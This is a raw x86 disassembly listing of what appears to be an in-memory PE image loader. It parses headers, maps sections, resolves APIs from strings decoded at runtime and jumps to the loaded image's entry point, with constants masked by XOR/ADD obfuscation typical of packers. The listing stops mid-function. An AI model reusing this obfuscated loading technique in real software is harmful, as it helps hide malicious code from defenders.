  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
